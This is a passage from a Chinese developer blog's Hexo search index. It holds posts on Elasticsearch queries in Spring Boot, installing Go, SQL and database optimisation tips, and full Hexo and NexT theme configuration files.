QueryBuilders.wildcardQuery("username","*"+value+"*"); // password字段等于1 QueryBuilder builder2 = QueryBuilders.wildcardQuery("password","*456*"); // 复合查询 BoolQueryBuilder boolQueryBuilder = QueryBuilders.boolQuery(); // and 结果中 username含有value 并且 password = 456 // boolQueryBuilder.must(builder1); // boolQueryBuilder.must(builder2); // or 结果中 username含有value 或 password = 456 boolQueryBuilder.should(builder1); boolQueryBuilder.should(builder2); System.out.println("查询的语句:"+boolQueryBuilder); Iterable&lt;ElasticUser&gt; searchResult = userDao.search(boolQueryBuilder); Iterator&lt;ElasticUser&gt; iterator = searchResult.iterator(); List&lt;ElasticUser&gt; list=new ArrayList&lt;&gt;(); while (iterator.hasNext()) &#123; list.add(iterator.next()); &#125; return list; &#125;&#125;]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>elasticsearch</tag>
        <tag>sping-data</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言入门（1）Go语言的安装与配置]]></title>
    <url>%2F2019%2F06%2F07%2FGo%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%EF%BC%881%EF%BC%89Go%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[1. 下载Go语言GO安装包下载地址： https://studygolang.com/dl 2. Windows下安装GO下载好之后，直接安装，下一步。。。。finsh 测试是否安装成功： 1go version 3. 配置GOPATH新建环境变量 GOPATH = D:/goWork GOPATH是你的工作目录，它包括三个目录：bin（存放编译好的可运行文件）、pkg（存放二进制文件）、src（存放源码文件） 当通过 go get github.com/astaxie/beego 下载的库都会放到这个GOPATH里面 4. 下载开发工具这里使用的开发工具为 goland 下载地址：https://www.jetbrains.com/go/ 5. 配置goland主要配置 GOROOT 和 GOPATH]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go安装</tag>
        <tag>go开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库优化总结]]></title>
    <url>%2F2019%2F06%2F07%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1 数据库设计方面：a. 对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。b. 应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如： select id from t where num is null 可以在num上设置默认值0，确保表中num列没有null值，然后这样查询： select id from t where num=0 c. 并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时,查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。 d. 索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。 e. 应尽可能的避免更新索引数据列，因为索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新索引数据列，那么需要考虑是否应将该索引建为索引。 f. 尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。 g. 尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。 h. 尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。 i. 避免频繁创建和删除临时表，以减少系统表资源的消耗。 j. 临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。 k. 在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。 l. 如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。 2 SQL语句方面：a. 应尽量避免在 where 子句中使用!=或&lt;&gt;操作符，否则将引擎放弃使用索引而进行全表扫描。 b. 应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如： select id from t where num=10 or num=20 可以这样查询： select id from t where num=10 union all select id from t where num=20 c. in 和 not in 也要慎用，否则会导致全表扫描，如： select id from t where num in(1,2,3) 对于连续的数值，能用 between 就不要用 in 了： select id from t where num between 1 and 3 d. 下面的查询也将导致全表扫描： select id from t where name like ‘%abc%’ e. 如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。 然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描： select id from t where num=@num 可以改为强制查询使用索引： select id from t with(index(索引名)) where num=@num f. 应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如： select id from t where num/2=100 应改为: select id from t where num=100*2 g. 应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如： select id from t where substring(name,1,3)=’abc’ –name以abc开头的id select id from t where datediff(day,createdate,’2005-11-30′)=0 –‘2005-11-30’生成的id 应改为: select id from t where name like ‘abc%’ select id from t where createdate&gt;=’2005-11-30′ and createdate&lt;’2005-12-1′ h. 不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。 i. 不要写一些没有意义的查询，如需要生成一个空表结构： select col1,col2 into #t from t where 1=0 这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样： create table #t(…) j. 很多时候用 exists 代替 in 是一个好的选择： select num from a where num in(select num from b) 用下面的语句替换： select num from a where exists(select 1 from b where num=a.num) k. 任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。 l. 尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。 m. 尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。 n. 尽量避免大事务操作，提高系统并发能力。 3 java方面：重点内容a.尽可能的少造对象。 b.合理摆正系统设计的位置。大量数据操作，和少量数据操作一定是分开的。大量的数据操作，肯定不是ORM框架搞定的。， c.使用jDBC链接数据库操作数据 d.控制好内存，让数据流起来，而不是全部读到内存再处理，而是边读取边处理； e.合理利用内存，有的数据要缓存 如何优化数据库，如何提高数据库的性能? 1） 硬件调整性能 最有可能影响性能的是磁盘和网络吞吐量,解决办法扩大虚拟内存，并保证有足够可以扩充的空间；把数据库服务器上的不必要服务关闭掉；把数据库服务器和主域服务器分开；把SQL数据库服务器的吞吐量调为最大；在具有一个以上处理器的机器上运行SQL。 2）调整数据库 若对该表的查询频率比较高，则建立索引；建立索引时，想尽对该表的所有查询搜索操作， 按照where选择条件建立索引，尽量为整型键建立为有且只有一个簇集索引，数据在物理上按顺序在数据页上，缩短查找范围，为在查询经常使用的全部列建立非簇集索引，能最大地覆盖查询；但是索引不可太多，执行UPDATE DELETE INSERT语句需要用于维护这些索引的开销量急剧增加；避免在索引中有太多的索引键；避免使用大型数据类型的列为索引；保证每个索引键值有少数行。 3）使用存储过程 应用程序的实现过程中，能够采用存储过程实现的对数据库的操作尽量通过存储过程来实现，因为存储过程是存放在数据库服务器上的一次性被设计、编码、测试，并被再次使用，需要执行该任务的应用可以简单地执行存储过程，并且只返回结果集或者数值，这样不仅可以使程序模块化，同时提高响应速度，减少网络流量，并且通过输入参数接受输入，使得在应用中完成逻辑的一致性实现。 4）应用程序结构和算法 建立查询条件索引仅仅是提高速度的前提条件，响应速度的提高还依赖于对索引的使用。因为人们在使用SQL时往往会陷入一个误区，即太关注于所得的结果是否正确，特别是对数据量不是特别大的数据库操作时，是否建立索引和使用索引的好坏对程序的响应速度并不大，因此程序员在书写程序时就忽略了不同的实现方法之间可能存在的性能差异，这种性能差异在数据量特别大时或者大型的或是复杂的数据库环境中（如联机事务处理OLTP或决策支持系统DSS）中表现得尤为明显。在工作实践中发现，不良的SQL往往来自于不恰当的索引设计、不充份的连接条件和不可优化的where子句。在对它们进行适当的优化后，其运行速度有了明显地提高！ 原文链接：https://m.2cto.com/database/201503/381295.html]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo中next主题配置]]></title>
    <url>%2F2019%2F06%2F03%2Fhexo%E4%B8%ADnext%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[1. hexo配置blog/_config.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Site# Site# 博客名称title: 派大星的博客 # 博客子标题subtitle: 派大星的个人博客 # 作者描述description: # 站点关键词，用于搜索优化keywords: 派大星,pibigstar # 博主名author: 派大星 # 站点语言 language: zh-CN # 时区 timezone: Asia/Shanghai # URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: http://pibigstar.comroot: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace: # Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: '' per_page: 10 order_by: -date # Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next# 发布## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/pibigstar/pibigstar.github.io.git branch: master# 实现搜索文章的功能search: path: search.xml field: post format: html limit: 100# 实现博客订阅功能feed: type: atom path: atom.xml limit: 20# 生成站点地图用于SEO优化sitemap: path: sitemap.xmlbaidusitmap: path: baidusitemap.xml 2. next主题配置blog/themes/next/_config.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815# ===============================================================# ========================= ATTENTION! ==========================# ===============================================================# NexT repository is moving here: https://github.com/theme-next# ===============================================================# It's rebase to v6.0.0 and future maintenance will resume there# ===============================================================# ---------------------------------------------------------------# Theme Core Configuration Settings# ---------------------------------------------------------------# Set to true, if you want to fully override the default configuration.# Useful if you don't want to inherit the theme _config.yml configurations.override: false# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# To get or check favicons visit: https://realfavicongenerator.net# Put your favicons into `hexo-site/source/` (recommend) or `hexo-site/themes/next/source/images/` directory.# Default NexT favicons placed in `hexo-site/themes/next/source/images/` directory.# And if you want to place your icons in `hexo-site/source/` root directory, you must remove `/images` prefix from pathes.# For example, you put your favicons into `hexo-site/source/images` directory.# Then need to rename &amp; redefine they on any other names, otherwise icons from Next will rewrite your custom icons in Hexo.favicon: small: /images/favicon-16x16-next.png medium: /images/favicon-32x32-next.png apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml# Set default keywords (Use a comma to separate)keywords: "Hexo, NexT"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss:footer: # Specify the date when the site was setup. # If not defined, current year will be used. #since: 2015 # Icon between year and copyright info. icon: user # If not defined, will be used `author` from Hexo main config. copyright: # ------------------------------------------------------------- # Hexo link (Powered by Hexo). powered: true theme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: true # Version info of NexT after scheme info (vX.X.X). version: true # ------------------------------------------------------------- # Any custom text can be defined here. #custom_text: Hosted by &lt;a target="_blank" href="https://pages.github.com"&gt;GitHub Pages&lt;/a&gt;# ---------------------------------------------------------------# SEO Settings# ---------------------------------------------------------------# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.# 开启seo优化seo: true# If true, will add site-subtitle to index page, added in main hexo config.# subtitle: Subtitle# 网页搜索及标签页显示副标题index_with_subtitle: ture# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash from link value (/archives -&gt; archives).# Usage: `Key: /link/ || icon`# Key is the name of menu item. If translate for this menu will find in languages - this translate will be loaded; if not - Key name will be used. Key is case-senstive.# Value before `||` delimeter is the target link.# Value after `||` delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, question icon will be loaded.menu: home: / || 主页 schedule: /schedule/ || 时间轴 tags: /tags/ || 标签 categories: /categories/ || 分类 # archives: /archives/ || 档案 sitemap: /sitemap.xml || 站点地图 about: /about/ || 关于我 # commonweal: /404/ || heartbeat# Enable/Disable menu icons.menu_icons: enable: true# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# 主题风格#scheme: Muse#scheme: Mist#scheme: Piscesscheme: Gemini# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links.# Usage: `Key: permalink || icon`# Key is the link label showing to end users.# Value before `||` delimeter is the target permalink.# Value after `||` delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, globe icon will be loaded.#social: #GitHub: https://github.com/yourname || github #E-Mail: mailto:yourname@gmail.com || envelope #Google: https://plus.google.com/yourname || google #Twitter: https://twitter.com/yourname || twitter #FB Page: https://www.facebook.com/yourname || facebook #VK Group: https://vk.com/yourname || vk #StackOverflow: https://stackoverflow.com/yourname || stack-overflow #YouTube: https://youtube.com/yourname || youtube #Instagram: https://instagram.com/yourname || instagram #Skype: skype:yourname?call|chat || skypesocial_icons: enable: true icons_only: false transition: false# Blog rollslinks_icon: linklinks_title: Linkslinks_layout: block#links_layout: inline#links: #Title: http://example.com/# 头像设置# in theme directory(source/images): /images/avatar.gif# in site directory(source/uploads): /uploads/avatar.gifavatar: /images/qq.png# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true # If true, all words will placed on next lines if header width longer then sidebar width. wrap: false# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right (only for Pisces | Gemini). position: left #position: right # Sidebar Display, available value (only for Muse | Mist): # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggle. display: post #display: always #display: hide #display: remove # Sidebar offset from top menubar in pixels (only for Pisces | Gemini). offset: 12 # Back to top in sidebar (only for Pisces | Gemini). b2t: false # Scroll percent label in b2t button. scrollpercent: false # Enable sidebar on narrow view (only for Muse | Mist). onmobile: false# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically saving scroll position on each post/page in cookies.save_scroll: false# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommend.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: true wordcount: false min2read: false totalcount: false separated_meta: true# Wechat Subscriber#wechat_subscriber: #enabled: true #qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg #description: ex. subscribe to my blog by scanning my public wechat account# Reward#reward_comment: Donate comment here#wechatpay: /images/wechatpay.jpg#alipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png# Declare license on postspost_copyright: enable: false license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Reduce padding / margin indents on devices with narrow width.mobile_layout_economy: false# Android Chrome header panel color ($black-deep).android_chrome_color: "#222"# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# 代码高亮分割# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: night eighties# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal italic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------# CAUTION! Safari Version 10.1.2 bug: https://github.com/iissnan/hexo-theme-next/issues/1844# To avoid space between header and sidebar in Pisces / Gemini themes recommended to use Web Safe fonts for `global` (and `logo`):# Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS# ---------------------------------------------------------------font: enable: false # Uri of fonts host. E.g. //fonts.googleapis.com (Default). host: # Font options: # `external: true` will load this font family from `host` above. # `family: Times New Roman`. Without any quotes. # `size: xx`. Use `px` as unit. # Global font settings used on &lt;body&gt; element. global: external: true family: Lato size: # Font settings for Headlines (h1, h2, h3, h4, h5, h6). # Fallback to `global` font settings. headings: external: true family: size: # Font settings for posts. # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo. # Fallback to `global` font settings. logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML# Han Support docs: https://hanzi.pro/han: false# Swiftype Search API Key#swiftype_key:# Baidu Analytics ID#baidu_analytics:# Duoshuo ShortName#duoshuo_shortname:# Disqusdisqus: enable: false shortname: count: true# Hypercomments#hypercomments_id:# changyanchangyan: enable: false appid: appkey:# Valine.# You can get your appid and appkey from https://leancloud.cn# more info please open https://valine.js.orgvaline: enable: false appid: # your leancloud application appid appkey: # your leancloud application appkey notify: false # mail notifier , https://github.com/xCss/Valine/wiki verify: false # Verification code placeholder: Just go go # comment box placeholder avatar: mm # gravatar style guest_info: nick,mail,link # custom comment header pageSize: 10 # pagination size# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Support for LiveRe comments system.# You can get your uid from https://livere.com/insight/myCode (General web site)#livere_uid: your uid# Gitment# Introduction: https://imsun.net/posts/gitment-introduction/# You can get your Github ID from https://api.github.com/users/&lt;Github username&gt;gitment: enable: false mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: false # Comments lazy loading with a button cleanly: false # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: # MUST HAVE, Your Github ID github_repo: # MUST HAVE, The repo you use to store Gitment comments client_id: # MUST HAVE, Github client id for the Gitment client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share# This plugin is more useful in China, make sure you known how to use it.# And you can find the use guide at official webiste: http://www.jiathis.com/.# Warning: JiaThis does not support https.#jiathis: ##uid: Get this uid from http://www.jiathis.com/#add_this_id:# Share#duoshuo_share: true# NeedMoreShare2# This plugin is a pure javascript sharing lib which is useful in China.# See: https://github.com/revir/need-more-share2# Also see: https://github.com/DzmVasileusky/needShareButton# iconStyle: default | box# boxForm: horizontal | vertical# position: top / middle / bottom + Left / Center / Right# networks: Weibo,Wechat,Douban,QQZone,Twitter,Linkedin,Mailto,Reddit,# Delicious,StumbleUpon,Pinterest,Facebook,GooglePlus,Slashdot,# Technorati,Posterous,Tumblr,GoogleBookmarks,Newsvine,# Evernote,Friendfeed,Vkontakte,Odnoklassniki,Mailruneedmoreshare2: enable: false postbottom: enable: false options: iconStyle: box boxForm: horizontal position: bottomCenter networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook float: enable: false options: iconStyle: box boxForm: horizontal position: middleRight networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# Bing Webmaster tools verification setting# See: https://www.bing.com/webmaster/#bing_site_verification:# Yandex Webmaster tools verification setting# See: https://webmaster.yandex.ru/#yandex_site_verification:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: true admin_enable: false user_id: 0 #admin_nickname: Author# Post widgets &amp; FB/VK comments settings.# ---------------------------------------------------------------# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# VKontakte API Support.# To get your AppID visit https://vk.com/editapp?act=createvkontakte_api: enable: false app_id: #&lt;app_id&gt; like: true comments: true num_of_posts: 10# Star rating support to each article.# To get your ID visit https://widgetpack.comrating: enable: false id: #&lt;app_id&gt; color: fc6423# ---------------------------------------------------------------# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: false app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Another tool to show number of visitors to each article.# visit https://console.firebase.google.com/u/0/ to get apiKey and projectId# visit https://firebase.google.com/docs/firestore/ to get more information about firestorefirestore: enable: false collection: articles #required, a string collection name to access firestore database apiKey: #required projectId: #required bluebird: false #enable this if you want to include bluebird 3.5.1(core version) Promise polyfill# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: false # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; page_pv_footer:# Tencent analytics ID# tencent_analytics:# Tencent MTA ID# tencent_mta:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: false# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"# Local search# Dependencies: https://github.com/flashlab/hexo-generator-searchlocal_search: enable: false # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1# ---------------------------------------------------------------# Tags Settings# ---------------------------------------------------------------# External URL with BASE64 encrypt &amp; decrypt.# Usage: &#123;% exturl text url "title" %&#125;# Alias: &#123;% extlink text url "title" %&#125;exturl: false# Note tag (bs-callout).note: # Note tag style values: # - simple bs-callout old alert style. Default. # - modern bs-callout new (v2-v3) alert style. # - flat flat callout style with background, like on Mozilla or StackOverflow. # - disabled disable all CSS styles import of note tag. style: simple icons: false border_radius: 3 # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6). # Offset also applied to label tag variables. This option can work with disabled note tag. light_bg_offset: 0# Label tag.label: true# Tabs tag.tabs: enable: true transition: tabs: false labels: true border_radius: 0#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Use velocity to animate everything.motion: enable: true async: false transition: # Transition variants: # fadeIn | fadeOut | flipXIn | flipXOut | flipYIn | flipYOut | flipBounceXIn | flipBounceXOut | flipBounceYIn | flipBounceYOut # swoopIn | swoopOut | whirlIn | whirlOut | shrinkIn | shrinkOut | expandIn | expandOut # bounceIn | bounceOut | bounceUpIn | bounceUpOut | bounceDownIn | bounceDownOut | bounceLeftIn | bounceLeftOut | bounceRightIn | bounceRightOut # slideUpIn | slideUpOut | slideDownIn | slideDownOut | slideLeftIn | slideLeftOut | slideRightIn | slideRightOut # slideUpBigIn | slideUpBigOut | slideDownBigIn | slideDownBigOut | slideLeftBigIn | slideLeftBigOut | slideRightBigIn | slideRightBigOut # perspectiveUpIn | perspectiveUpOut | perspectiveDownIn | perspectiveDownOut | perspectiveLeftIn | perspectiveLeftOut | perspectiveRightIn | perspectiveRightOut post_block: fadeIn post_header: slideDownIn post_body: slideDownIn coll_header: slideLeftIn # Only for Pisces | Gemini. sidebar: slideUpIn# Fancyboxfancybox: true# Progress bar in the top during page loading.pace: false# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-minimal# Canvas-nestcanvas_nest: false# three_wavesthree_waves: false# canvas_linescanvas_lines: false# canvas_spherecanvas_sphere: false# Only fit scheme Pisces# Canvas-ribbon# size: The width of the ribbon.# alpha: The transparency of the ribbon.# zIndex: The display level of the ribbon.canvas_ribbon: enable: false size: 300 alpha: 0.6 zIndex: -1# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.2 # See: https://github.com/HubSpot/pace # Or use direct links below: # pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js # pace_css: 